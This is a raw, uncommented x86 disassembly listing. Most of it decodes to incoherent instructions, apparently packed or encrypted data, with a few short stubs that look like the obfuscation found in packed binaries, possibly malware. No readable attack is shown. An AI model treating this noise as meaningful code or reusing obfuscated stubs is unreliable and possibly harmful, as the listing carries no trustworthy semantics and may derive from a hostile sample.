  4039e9:	mov    ds:0x3843c920,al
  4039ee:	adc    DWORD PTR [edi+0x25b031ef],esp
  4039f4:	or     eax,0xebb3f99a
  4039f9:	pop    edi
  4039fa:	imul   ecx,DWORD PTR [edx-0x2bef097e],0xfffffff2
  403a01:	pop    esp
  403a02:	scas   eax,DWORD PTR es:[edi]
  403a03:	ja     0x403a1a
  403a05:	ja     0x40398f
  403a07:	fnstcw WORD PTR [ecx-0x3]
  403a0a:	inc    edx
  403a0b:	sub    bl,BYTE PTR [ecx+0x5a606682]
  403a11:	or     al,0x5c
  403a13:	pop    edx
  403a14:	ins    DWORD PTR es:[edi],dx
  403a15:	sahf   
  403a16:	clc    
  403a17:	or     DWORD PTR [edi-0x1a],ebp
  403a1a:	push   ds
  403a1b:	leave  
  403a1c:	or     al,0x86
  403a1e:	mov    esi,0x8d246f57
  403a23:	mov    dl,BYTE PTR [esi]
  403a25:	cmp    BYTE PTR [edx-0x22],cl
  403a28:	dec    ecx
  403a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a2a:	jae    0x403a8e
  403a2c:	mov    esi,0xc8e35b99
  403a31:	mov    esp,0xc83c1066
  403a36:	mov    ds:0x3ed06027,al
  403a3b:	int    0xfe
  403a3d:	push   edi
  403a3e:	push   ebx
  403a3f:	(bad)  
  403a40:	fwait
  403a41:	repz push ebx
  403a43:	xchg   ebp,eax
  403a44:	jmp    0x403a53
  403a46:	pop    ebp
  403a47:	stc    
  403a48:	scas   eax,DWORD PTR es:[edi]
  403a49:	inc    ebp
  403a4a:	mov    esp,0x9b49d7c
  403a4f:	rcr    BYTE PTR [eax+0x75],cl
  403a52:	repz adc DWORD PTR [esi+0x40525a6b],ecx
  403a59:	cmp    esi,DWORD PTR [esi]
  403a5b:	jp     0x403aca
  403a5d:	xchg   BYTE PTR [edx+0x3c25080a],bh
  403a63:	aas    
  403a64:	add    ebp,ecx
  403a66:	(bad)  
  403a67:	mov    esp,edi
  403a69:	add    al,0x27
  403a6b:	mov    ebp,0x7f0cee33
  403a70:	pushf  
  403a71:	sbb    edi,ecx
  403a73:	loope  0x403a9c
  403a75:	std    
  403a76:	stc    
  403a77:	mov    bh,0xa5
  403a79:	dec    edx
  403a7a:	and    BYTE PTR [ecx-0x43],cl
  403a7d:	add    BYTE PTR [esi],0x11
  403a80:	in     al,0xe0
  403a82:	icebp  
  403a83:	ins    DWORD PTR es:[edi],dx
  403a84:	fnstsw WORD PTR [edx]
  403a86:	pop    ebx
  403a87:	pop    edx
  403a88:	div    BYTE PTR [edx-0x6b]
  403a8b:	add    DWORD PTR [eax+0x1e],edi
  403a8e:	dec    ebp
  403a8f:	mov    ecx,0xae266d0a
  403a94:	mov    dl,0x61
  403a96:	add    eax,0x12c5103d
  403a9b:	imul   ebx,ebp,0x75e3a72
  403aa1:	cmc    
  403aa2:	retf   
  403aa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aa5:	and    dh,bl
  403aa7:	mov    ecx,0xd6e14798
  403aac:	dec    esi
  403aad:	fwait
  403aae:	pop    ss
  403aaf:	fbld   TBYTE PTR [eax-0x64a9a02f]
  403ab5:	test   BYTE PTR [eax+0x45ce8992],ah
  403abb:	sbb    cl,dh
  403abd:	or     BYTE PTR [esi],ah
  403abf:	rcr    esi,0x39
  403ac2:	jae    0x403ab2
  403ac4:	mov    WORD PTR [eax-0x6f],gs
  403ac7:	lods   eax,DWORD PTR ds:[esi]
  403ac8:	jo     0x403a5a
  403aca:	fimul  DWORD PTR [esi-0x2c]
  403acd:	gs scas al,BYTE PTR es:[edi]
  403acf:	or     edi,DWORD PTR [edi]
  403ad1:	inc    ecx
  403ad2:	stc    
  403ad3:	or     edi,DWORD PTR [esi-0xf]
  403ad6:	push   ebx
  403ad7:	pop    ebp
  403ad8:	dec    esi
  403ad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ada:	loopne 0x403adb
  403adc:	pop    esi
  403add:	mov    eax,0xa46e654c
  403ae2:	(bad)  
  403ae4:	popf   
  403ae5:	hlt    
  403ae6:	mov    dh,0x63
  403ae8:	jne    0x403ad4
  403aea:	sub    BYTE PTR [ebx+edi*8-0x3d],0xe0
  403aef:	jbe    0x403a7b
  403af1:	inc    ebp
  403af2:	dec    DWORD PTR [edi]
  403af4:	mov    bh,0xd
  403af6:	jmp    0x403ade
  403af8:	inc    edx
  403af9:	add    BYTE PTR [ecx],dl
  403afb:	or     eax,0x42fd76
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e124,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fcfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fcf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx-0xebaa869],esi
  403b3e:	lds    bx,DWORD PTR [esi]
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0x4770707d
  403b48:	je     0x403b3c
  403b4a:	ror    bh,0xc5
  403b4d:	add    eax,eax
  403b4f:	inc    esp
  403b50:	inc    edi
  403b51:	shl    BYTE PTR ds:0x18d14a5,cl
  403b57:	dec    esp
  403b58:	xchg   BYTE PTR [edx-0x422419b7],al
  403b5e:	leave  
  403b5f:	cwde   
  403b60:	cmc    
  403b61:	push   esp
  403b62:	mov    ebp,0x9153bd68
  403b67:	sub    cl,ah
  403b69:	ins    DWORD PTR es:[edi],dx
  403b6a:	les    edx,FWORD PTR [eax-0x6d]
  403b6d:	cmp    eax,0x6188396
  403b72:	jnp    0x403b16
  403b74:	mov    ebp,0x29331ee9
  403b79:	pop    es
  403b7a:	mov    edx,0xacef44a2
  403b7f:	add    al,0x12
  403b81:	cdq    
  403b82:	dec    edx
  403b83:	imul   BYTE PTR [esi+0x4ea446c6]
  403b89:	scas   al,BYTE PTR es:[edi]
  403b8a:	xor    BYTE PTR [edi-0x4b86accf],bh
  403b90:	cld    
  403b91:	addr16 cld 
  403b93:	mov    al,0x22
  403b95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b96:	rsm    
  403b98:	cmp    DWORD PTR [edx],edx
  403b9a:	push   esp
  403b9b:	retf   0x2465
  403b9e:	je     0x403bee
  403ba0:	jae    0x403be4
  403ba2:	(bad)  
  403ba3:	(bad)  
  403ba4:	stc    
  403ba5:	jb     0x403b66
  403ba7:	inc    esp
  403ba8:	xchg   edi,eax
  403ba9:	xor    bh,BYTE PTR [ebx+0xf]
  403bac:	jp     0x403bdf
  403bae:	mov    bl,0xed
  403bb0:	dec    ebx
  403bb1:	nop
  403bb2:	aam    0x94
  403bb4:	xor    eax,0x32d8735f
  403bb9:	mov    DWORD PTR [ebx+0xf],edx
  403bbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bbd:	or     al,0xef
  403bbf:	push   0x69
  403bc1:	data16 cmp al,0x4c
  403bc4:	bound  eax,QWORD PTR [ebx]
  403bc6:	jbe    0x403c25
  403bc8:	pop    ebx
  403bc9:	rol    esi,1
  403bcb:	test   eax,0xb086d67b
  403bd0:	cmp    bl,BYTE PTR [ebx+esi*4-0x7de1d689]
  403bd7:	cdq    
  403bd8:	rol    BYTE PTR [ebx-0x9183770],1
  403bde:	add    al,0x99
  403be0:	test   al,0x3b
  403be2:	jp     0x403c13
  403be4:	push   edx
  403be5:	sbb    eax,eax
  403be7:	(bad)
  403beb:	nop
  403bec:	shl    BYTE PTR [eax+0x48a1ed61],1
  403bf2:	rol    bl,cl
  403bf4:	(bad)  
  403bf8:	xor    eax,0x35311f01
  403bfd:	pop    esi
  403bfe:	test   BYTE PTR ds:0x20269274,ah
  403c04:	loope  0x403c5a
  403c06:	js     0x403c46
  403c08:	test   eax,0x50a93f81
  403c0d:	data16 jle 0x403ba9
  403c10:	add    esp,ebx
  403c12:	dec    ecx
  403c13:	inc    edi
  403c14:	push   eax
  403c15:	cmp    DWORD PTR [esi-0x538e0efa],ebx
  403c1b:	out    dx,al
  403c1c:	cwde   
  403c1d:	call   0xd499:0xebfabfc3
  403c24:	icebp  
  403c25:	xchg   DWORD PTR [ebp+ebx*2+0x7c],esp
  403c29:	mov    eax,ds:0x5624eab7
  403c2e:	lea    edx,[ebx]
  403c30:	xchg   eax,esp
  403c32:	aad    0x4a
  403c34:	push   0x37307044
  403c39:	scas   al,BYTE PTR es:[edi]
  403c3a:	out    0x94,al
  403c3c:	clc    
  403c3d:	pop    esp
  403c3e:	outs   dx,BYTE PTR ds:[esi]
  403c3f:	(bad)  
  403c40:	cmp    al,0x12
  403c42:	(bad)  
  403c43:	lds    eax,FWORD PTR [esi+0x5a6f7ebc]
  403c49:	imul   DWORD PTR [edi+0x2b]
  403c4c:	aaa    
  403c4d:	retf   
  403c4e:	xlat   BYTE PTR ds:[ebx]
  403c4f:	mov    eax,ds:0xb4300d97
  403c54:	inc    esp
  403c55:	xor    eax,ecx
  403c57:	bound  ebx,QWORD PTR [ecx]
  403c59:	mov    cl,0x8c
  403c5b:	int    0xdc
  403c5d:	pop    ebp
  403c5e:	stos   BYTE PTR es:[edi],al
  403c5f:	push   esp
  403c60:	pop    esp
  403c62:	lods   eax,DWORD PTR ds:[esi]
  403c63:	xor    bh,al
  403c65:	xor    DWORD PTR [ebp-0x7d2bba47],eax
  403c6b:	mov    ebx,DWORD PTR [edx+0x4ce6b8da]
  403c71:	(bad)  
  403c72:	mov    BYTE PTR [ebx-0x2b25cc1],bh
  403c78:	add    BYTE PTR [ebp+0x6313e468],al
  403c7e:	sub    eax,0xf53b908c
  403c83:	jno    0x403cb8
  403c85:	jp     0x403ceb
  403c87:	(bad)  
  403c88:	xchg   ebp,eax
  403c89:	data16 mov al,0x39
  403c8c:	cli    
  403c8d:	mov    cl,0x66
  403c8f:	push   ebx
  403c90:	or     bh,BYTE PTR [eax+edx*4-0x35]
  403c94:	xor    eax,0xaf4b0b99
  403c99:	test   DWORD PTR [edi],edx
  403c9b:	and    DWORD PTR [esi],0x8d401eb0
  403ca1:	test   BYTE PTR [ebp-0x15],0x71
  403ca5:	xor    eax,0xf4662fc
  403caa:	ficom  WORD PTR [eax-0x4f8c6192]
  403cb0:	adc    BYTE PTR [eax+esi*8],bh
  403cb3:	sub    ch,BYTE PTR ds:0xe6ea4800
  403cb9:	mov    esi,0x584ac346
  403cbe:	cmp    BYTE PTR [ebp+0x13d97ed3],al
  403cc4:	popa   
  403cc5:	ja     0x403c60
  403cc7:	into   
  403cc8:	cmc    
  403cc9:	nop
  403cca:	ins    DWORD PTR es:[edi],dx
  403ccb:	cli    
  403ccc:	aas    
  403ccd:	or     al,0xbe
  403ccf:	push   eax
  403cd0:	(bad)
  403cd3:	jb     0x403cab
  403cd5:	adc    eax,ebx
  403cd7:	mov    ah,BYTE PTR [eax-0x1ec6f424]
  403cdd:	adc    bh,BYTE PTR [edx-0x588dd48]
  403ce3:	push   0xb53ecad5
  403ce8:	mov    DWORD PTR [edx],eax
  403cea:	pop    esi
  403ceb:	clc    
  403cec:	mov    bh,0x9d
  403cee:	or     al,0x3a
  403cf0:	dec    ebp
  403cf1:	retf   
  403cf2:	pop    esp
  403cf3:	dec    ecx
  403cf4:	adc    al,BYTE PTR [esi+0x33]
  403cf7:	ret    
  403cf8:	jae    0x403d5a
  403cfa:	jns    0x403d19
  403cfc:	jmp    0x403d3f
  403cfe:	and    ebp,DWORD PTR [eax-0x9]
  403d01:	adc    eax,0x4cfdbdd5
  403d06:	adc    al,0x59
  403d08:	inc    edi
  403d09:	xchg   edi,eax
  403d0a:	bound  eax,QWORD PTR [edx-0x34]
  403d0d:	xchg   edx,eax
  403d0e:	dec    esi
  403d0f:	popa   
  403d10:	aaa    
  403d11:	mov    cl,0xb6
  403d13:	inc    esp
  403d14:	cdq    
  403d15:	call   0x8a9a:0x6b8f8e2
  403d1c:	fsub   st(5),st
  403d1e:	mov    ds,WORD PTR [edx+0x3d]
  403d21:	jns    0x403d59
  403d23:	push   edx
  403d24:	pop    ebx
  403d25:	xor    edx,ecx
  403d27:	sar    BYTE PTR [ecx],cl
  403d29:	sub    ah,cl
  403d2b:	cmp    edi,DWORD PTR [eax+0x3f]
  403d2e:	xchg   ebx,eax
  403d2f:	in     eax,dx
  403d30:	shl    dh,cl
  403d32:	icebp  
  403d33:	adc    eax,0x101d721f
  403d38:	(bad)  
  403d39:	aad    0xa5
  403d3b:	inc    ebx
  403d3c:	xchg   ecx,eax
  403d3d:	pop    DWORD PTR [ebx]
  403d3f:	rcl    BYTE PTR [edi+0x74],0xf2
  403d43:	dec    eax
  403d44:	sbb    eax,esi
  403d46:	rcl    DWORD PTR cs:[ebx],1
  403d49:	js     0x403d0a
  403d4b:	and    ebx,ebp
  403d4d:	daa    
  403d4e:	mov    ebx,0x13fceff9
  403d53:	pop    ebp
  403d54:	and    ch,al
  403d56:	hlt    
  403d57:	pop    ebp
  403d58:	or     eax,DWORD PTR [esp+esi*1-0x5c]
  403d5c:	inc    ebp
  403d5d:	lods   eax,DWORD PTR ds:[esi]
  403d5e:	test   eax,0xb0c5dc08
  403d63:	mov    dh,0x76
  403d65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d66:	stos   DWORD PTR es:[edi],eax
  403d67:	and    DWORD PTR [edx+0x6b8cf20c],eax
  403d6d:	ins    BYTE PTR es:[edi],dx
  403d6e:	into   
  403d6f:	enter  0x8f6c,0xdd
  403d73:	add    al,0x2f
  403d75:	rcl    edx,0x70
  403d78:	jecxz  0x403db1
  403d7a:	out    dx,al
  403d7b:	push   esp
  403d7c:	in     al,0x81
  403d7e:	into   
  403d7f:	retf   
  403d80:	rol    al,cl
  403d82:	mov    edx,0xbd583e5b
  403d87:	dec    edx
  403d88:	not    ebx
  403d8a:	and    ebx,ecx
  403d8c:	pop    edi
  403d8d:	(bad)  
  403d8e:	dec    edi
  403d8f:	inc    ebx
  403d90:	or     eax,ecx
  403d92:	dec    esp
  403d93:	jns    0x403d71
  403d95:	sbb    eax,0xfb9f9948
  403d9a:	in     eax,0xf6
  403d9c:	ss pop ss
  403d9e:	mov    edx,0xbd508bc3
  403da3:	in     al,dx
  403da4:	fwait
  403da5:	lods   al,BYTE PTR ds:[esi]
  403da6:	in     eax,dx
  403da7:	jge    0x403e27
  403da9:	loopne 0x403d4f
  403dab:	cmp    DWORD PTR [esi],edi
  403dad:	clc    
  403dae:	ret    0xd1f6
  403db1:	mov    ebx,0x615b8aa3
  403db6:	retf   
  403db7:	pop    eax
  403db8:	xlat   BYTE PTR ds:[ebx]
  403db9:	mov    ch,0xbe
  403dbb:	inc    edx
  403dbc:	mov    ds:0xddf5d93b,al
  403dc1:	cmp    DWORD PTR [ecx],esi
  403dc3:	add    al,0xa6
  403dc5:	xchg   DWORD PTR [edx-0x75],ecx
  403dc8:	nop
  403dc9:	sub    BYTE PTR [ecx-0x36af95a8],dl
  403dcf:	mov    al,0x3e
  403dd1:	sar    dh,cl
  403dd3:	push   0x206ed2a
  403dd8:	test   eax,0x42bbb9a9
  403ddd:	call   0x3535:0xa4cd188e
  403de4:	sahf   
  403de5:	pop    ebx
  403de6:	fdivr  DWORD PTR [esi-0x19802d26]
  403dec:	xchg   edx,eax
  403ded:	adc    DWORD PTR [ebp+0x27],0x4
  403df1:	mov    al,BYTE PTR [ecx+0x93c0b9f]
  403df7:	inc    ebp
  403df8:	scas   al,BYTE PTR es:[edi]
  403df9:	lock or DWORD PTR [edx+0x38],edx
  403dfd:	loope  0x403e4d
  403dff:	sbb    ecx,DWORD PTR [esi+eax*4+0x29]
  403e03:	sub    al,0x4e
  403e05:	outs   dx,BYTE PTR ds:[esi]
  403e06:	inc    eax
  403e07:	outs   dx,BYTE PTR ds:[esi]
  403e08:	sub    BYTE PTR [esi+0x247620b5],cl
  403e0e:	shr    BYTE PTR [edi-0x2a3f29c],1
  403e14:	mov    al,0x7
  403e16:	retf   
  403e17:	mov    al,ds:0xa24a0ea3
  403e1c:	enter  0x8ee1,0x5c
  403e20:	xchg   esp,eax
  403e21:	maskmovq mm5,(bad)
  403e22:	imul   DWORD PTR [eax]
  403e24:	mov    eax,0x110dee2c
  403e29:	js     0x403e14
  403e2b:	xor    BYTE PTR [ebx+0x67],dh
  403e2e:	cmp    eax,ebx
  403e30:	cmp    edi,DWORD PTR [edx-0x7809ce8c]
  403e36:	push   ss
  403e37:	pop    edi
  403e38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e3a:	imul   ebx,DWORD PTR [esi+0x7cb2b369],0xb08a0eda
  403e44:	pop    ds
  403e45:	call   0xcf46:0x2a42fa3b
  403e4c:	data16 mov ds:0x548253c8,al
  403e52:	pop    ss
  403e53:	js     0x403e68
  403e55:	imul   edx,DWORD PTR [edx],0xeec4e2fe
  403e5b:	stos   DWORD PTR es:[edi],eax
  403e5c:	mov    dl,0x2b
  403e5e:	xor    cl,BYTE PTR [eax+0x28]
  403e61:	push   esi
  403e62:	xor    al,0xa4
  403e64:	test   BYTE PTR [esi+0x6d],bl
  403e67:	test   al,0x5f
  403e6a:	les    esi,FWORD PTR [edi+eax*1]
  403e6d:	int    0xba
  403e6f:	add    dl,bl
  403e71:	out    dx,al
  403e72:	neg    edi
  403e74:	push   ds
  403e75:	and    eax,0x1aae9741
  403e7a:	pop    ss
  403e7b:	ja     0x403e49
  403e7d:	pop    ds
  403e7e:	imul   ecx,edi,0x24
  403e81:	neg    DWORD PTR [esi+0x65536126]
  403e87:	mov    cl,0xb
  403e89:	inc    ebx
  403e8a:	mov    DWORD PTR [ebp-0x10],0xf89c8530
  403e91:	mov    eax,DWORD PTR [ebp-0x8]
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e11c
  403ea2:	adc    DWORD PTR ds:0x42e70f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fd72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e6ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0xb7c01c35
  403eec:	adc    eax,0x701b8277
  403ef1:	jo     0x403f30
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403f47
  403ef7:	ror    BYTE PTR ds:0xe298f8e1,0xe1
  403efe:	(bad)  
  403eff:	jcxz   0x403eef
  403f02:	loop   0x403eb8
  403f04:	mov    eax,ds:0x32083979
  403f09:	cld    
  403f0a:	fiadd  WORD PTR [ecx+0x3edc0922]
  403f10:	add    al,0x3d
  403f12:	sub    ebx,DWORD PTR [edx]
  403f14:	cmp    BYTE PTR [edx],dh
  403f16:	sub    al,BYTE PTR [ebp+0x609cbf7c]
  403f1c:	or     DWORD PTR [eax],0x76
  403f1f:	shl    DWORD PTR ds:0x44bfb766,0x28
  403f27:	retf   0x5914
  403f2a:	fcom   QWORD PTR [edi-0x35ed0d01]
  403f30:	add    dl,dh
  403f32:	sbb    edi,edi
  403f34:	inc    edx
  403f35:	push   esp
  403f36:	scas   eax,DWORD PTR es:[edi]
  403f37:	inc    esp
  403f38:	bswap  edi
  403f3a:	inc    BYTE PTR [ecx]
  403f3c:	add    eax,0x76bbcda7
  403f41:	jae    0x403f62
  403f43:	add    al,0xb3
  403f45:	jle    0x403f65
  403f47:	pop    ds
  403f48:	mov    eax,ds:0x6bb6ce84
  403f4d:	call   0x6082:0xfa6afa64
  403f54:	shl    BYTE PTR [edx+eiz*8],1
  403f57:	inc    esi
  403f58:	inc    edx
  403f59:	loope  0x403f06
  403f5b:	fbld   TBYTE PTR [edx]
  403f5d:	jp     0x403fd0
  403f5f:	dec    eax
  403f60:	jo     0x403fb4
  403f62:	loope  0x403f62
  403f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f65:	fst    DWORD PTR [eax+ecx*4+0x2f45b3b0]
  403f6c:	call   0x1f77f82d
  403f71:	mov    ch,0x97
  403f73:	or     DWORD PTR [eax-0x1e],ebp
  403f76:	inc    eax
  403f77:	scas   al,BYTE PTR es:[edi]
  403f78:	sbb    dl,ch
  403f7a:	add    eax,0x15decc0b
  403f7f:	sbb    DWORD PTR [ebx-0x5],edi
  403f82:	retf   
  403f83:	dec    edi
  403f84:	pop    esp
  403f85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f86:	test   dh,dl
  403f88:	xchg   ecx,eax
  403f89:	mov    esp,0xf14fcf70
  403f8e:	and    eax,0x372a12b6
  403f93:	jecxz  0x40400b
  403f95:	cmp    al,0x20
  403f97:	xchg   DWORD PTR ss:[ebp-0x700cd4bf],ebp
  403f9e:	sbb    bh,0x12
  403fa1:	je     0x403f70
  403fa3:	pop    esi
  403fa4:	cwde   
  403fa5:	mov    ebx,gs
  403fa7:	adc    dl,BYTE PTR [ecx-0x8ce9cc1]
  403fad:	and    DWORD PTR [edi+0x58],esp
  403fb0:	std    
  403fb1:	mov    al,0x76
  403fb3:	mov    al,0x8b
  403fb5:	jl     0x403ff7
  403fb7:	sbb    BYTE PTR [edi-0x5e],0x80
  403fbb:	mov    ch,0xdf
  403fbd:	mov    cl,0xa2
  403fbf:	inc    BYTE PTR [edx+0x19]
  403fc2:	mov    eax,0xb4c5a9d9
  403fc7:	jbe    0x403fa9
  403fc9:	mov    ch,0x97
  403fcb:	(bad)  
  403fcc:	mov    ds:0xd55cabdb,eax
  403fd1:	mov    gs,WORD PTR [edx]
  403fd3:	fmul   QWORD PTR [eax+eiz*4]
  403fd6:	in     al,0x90
  403fd8:	call   0xcdfb:0xdf47f861
  403fdf:	icebp  
  403fe0:	dec    eax
  403fe1:	cdq    
  403fe2:	cmp    dh,BYTE PTR [edx]
  403fe4:	aas    
  403fe5:	addr16 inc esp
  403fe7:	push   esp
  403fe8:	jb     0x404065
  403fea:	ret    
  403feb:	in     al,0xd6
  403fed:	mov    esp,0x292b5931
  403ff2:	pop    eax
  403ff3:	jg     0x403fb8
  403ff5:	paddd  mm6,QWORD PTR [ebp+0x2600c5e8]
  403ffc:	and    ebp,ebp
  403ffe:	rcr    DWORD PTR [eax+0x6],cl
  404001:	add    ebx,DWORD PTR [ebp+0x66]
  404004:	mov    ds:0x1f380596,al
  404009:	add    al,0xeb
  40400b:	dec    edi
  40400c:	or     ah,al
  40400e:	or     eax,DWORD PTR [edx]
  404010:	xor    BYTE PTR [eax],cl
  404012:	pop    ecx
  404013:	int    0x3a
  404015:	das    
  404016:	cld    
  404017:	ror    DWORD PTR [esi],1
  404019:	cmp    ch,cl
  40401b:	push   ds
  40401c:	in     eax,dx
  40401d:	rcr    DWORD PTR [esp+ebp*4+0x14ce01e],0x44
  404025:	stos   DWORD PTR es:[edi],eax
  404026:	fist   WORD PTR [ebx-0x66fac3fc]
  40402c:	pop    edx
  40402d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40402e:	mov    ds:0x1490cc02,al
  404033:	loope  0x40404d
  404035:	repnz add al,0xc3
  404038:	in     eax,dx
  404039:	mov    ch,bl
  40403b:	and    BYTE PTR [esi+ecx*2],al
  40403e:	lods   eax,DWORD PTR ds:[esi]
  40403f:	in     eax,0xb9
  404041:	fs loope 0x40408a
  404044:	adc    bl,BYTE PTR [eax-0x5b]
  404047:	pop    edx
  404048:	inc    edi
  404049:	in     eax,dx
  40404a:	and    DWORD PTR [edx-0xf],ecx
  40404d:	and    ecx,edx
  40404f:	push   eax
  404050:	xchg   ebx,eax
  404051:	shl    ebx,cl
  404053:	inc    eax
  404054:	imul   ebx
  404056:	(bad)  
  404057:	cs push 0xffffff81
  40405a:	push   0x3c
  40405c:	test   al,0x99
  40405e:	mov    cl,0x36
  404060:	xchg   edi,eax
  404061:	jb     0x4040cf
  404063:	cs pop DWORD PTR gs:[esi-0x19]
  404068:	dec    esi
  404069:	cmp    BYTE PTR gs:[eax+0x48ba86de],cl
  404070:	(bad)  
  404071:	aam    0xfb
  404073:	xor    eax,0x549fb5aa
  404078:	fild   QWORD PTR [edx-0xf]
  40407b:	sbb    ebx,DWORD PTR [eax-0x3a5d9e50]
  404081:	mov    ah,0xe8
  404083:	jno    0x40405c
  404085:	mov    ds:0xb27ff1,al
  40408a:	lds    eax,FWORD PTR [esi]
  40408c:	rol    WORD PTR [edi],1
  40408f:	push   0x385fedb8
  404094:	je     0x404033
  404096:	sbb    BYTE PTR [edx+0x7a],dh
  404099:	jmp    0x4f6a5555
  40409e:	sbb    BYTE PTR [esi],dl
  4040a0:	sbb    esi,DWORD PTR [ecx-0x5619822b]
  4040a6:	pop    eax
  4040a7:	lods   eax,DWORD PTR ds:[esi]
  4040a8:	call   0x8eb572bc
  4040ad:	or     BYTE PTR [eax+0x70],bh
  4040b0:	(bad)  
  4040b1:	call   0xa75f:0x8afca64c
  4040b8:	dec    edx
  4040b9:	adc    DWORD PTR [esi],ecx
  4040bb:	dec    edi
  4040bc:	daa    
  4040bd:	jo     0x4040e2
  4040bf:	pushf  
  4040c0:	inc    ebx
  4040c1:	(bad)  
  4040c2:	ss ins DWORD PTR es:[edi],dx
  4040c4:	pop    ss
  4040c5:	mov    bl,0xbd
  4040c7:	or     DWORD PTR [ebp+eiz*4+0x767339a0],0x932b0602
  4040d2:	and    edi,DWORD PTR [esi+0x2e]
  4040d5:	jae    0x4040d5
  4040d7:	mov    ds:0xeba4371d,al
  4040dc:	pushf  
  4040dd:	cs pop ds
  4040df:	jno    0x4040d4
  4040e1:	shr    DWORD PTR [edi-0x66],1
  4040e4:	and    al,0x21
  4040e6:	fisubr WORD PTR [ebx]
  4040e8:	stc    
  4040e9:	repnz imul ebp,DWORD PTR [ecx+ebp*8+0x29b9a765],0x6f184fe
  4040f5:	sbb    eax,0x922b425f
  4040fa:	repnz xchg ecx,eax
  4040fc:	push   ss
  4040fd:	jp     0x4040b6
  4040ff:	psubd  mm6,mm4
  404102:	add    eax,0x75d34b9a
  404107:	inc    edx
  404108:	mov    dl,0x11
  40410a:	lahf   
  40410b:	pop    edi
  40410c:	ficomp WORD PTR [ecx]
  40410e:	pusha  
  40410f:	stos   BYTE PTR es:[edi],al
  404110:	aaa    
  404111:	test   BYTE PTR [esi+0x40],0x49
  404115:	fisub  DWORD PTR [eax+0x630d0e75]
  40411b:	sbb    al,0xe7
  40411d:	jb     0x40413d
  40411f:	dec    ebx
  404120:	ss push eax
  404122:	punpckldq mm0,DWORD PTR [edx-0x1b6906d0]
  404129:	inc    ebp
  40412a:	je     0x404138
  40412c:	sub    al,0x6e
  40412e:	jg     0x404160
  404130:	addr16 and eax,0xedb813a8
  404136:	dec    ebx
  404137:	(bad)  
  404138:	rcr    BYTE PTR ds:0x3a84e872,cl
  40413e:	loope  0x4040e9
  404140:	push   esi
  404141:	aad    0xf1
  404143:	lea    eax,[ebx+0x47]
  404146:	popf   
  404147:	dec    ebx
  404148:	xor    BYTE PTR [eax-0x466bd99d],dh
  40414e:	adc    dh,ah
  404150:	cmp    bl,BYTE PTR [ebx+0x7b8a50ba]
  404156:	fldenv [ebx+eiz*8+0x44d15e4e]
  40415d:	mov    dl,0xc2
  40415f:	cdq    
  404160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404161:	aaa    
  404162:	jnp    0x4041b0
  404164:	fldcw  WORD PTR [edi+0x1]
  404167:	sbb    DWORD PTR [ebp+0x60dcc3a6],0xe1988926
  404171:	inc    eax
  404172:	add    eax,0xc3bd7153
  404177:	sub    eax,0x6eec1e3c
  40417c:	sbb    al,0x5d
  40417e:	dec    ebp
  40417f:	sbb    DWORD PTR [eax-0x5229bbe7],0x25922c86
  404189:	xchg   DWORD PTR [edx-0x43450ca0],edi
  40418f:	jp     0x4041df
  404191:	add    DWORD PTR [edi],esp
  404193:	addr16 mov bl,0x78
  404196:	test   BYTE PTR [ebx-0x610d4220],bl
  40419c:	aam    0xd
  40419e:	jns    0x40418a
  4041a0:	inc    edi
  4041a1:	add    al,0x53
  4041a3:	int3   
  4041a4:	and    esi,edx
  4041a6:	out    dx,eax
  4041a7:	jmp    0xb57d5036
  4041ac:	scas   al,BYTE PTR es:[edi]
  4041ad:	mov    dh,0xc9
  4041af:	inc    esp
  4041b0:	repnz scas al,BYTE PTR es:[edi]
  4041b2:	stos   BYTE PTR es:[edi],al
  4041b3:	jo     0x404164
  4041b5:	inc    eax
  4041b6:	ret    0x1e40
  4041b9:	dec    ebp
  4041ba:	pop    esi
  4041bb:	adc    BYTE PTR ds:0x451690e5,dh
  4041c1:	inc    ebx
  4041c2:	dec    ebx
  4041c3:	mov    DWORD PTR [edi+0x679ecef],ecx
  4041c9:	gs int3 
  4041cb:	xchg   edi,eax
  4041cc:	mov    ebx,gs
  4041ce:	fsubr  DWORD PTR [ebp-0x7aef8be2]
  4041d4:	push   eax
  4041d5:	sub    ch,BYTE PTR [edi+0x688a0ca6]
  4041db:	ins    BYTE PTR es:[edi],dx
  4041dc:	or     cl,BYTE PTR [edx]
  4041de:	or     bl,BYTE PTR [eax]
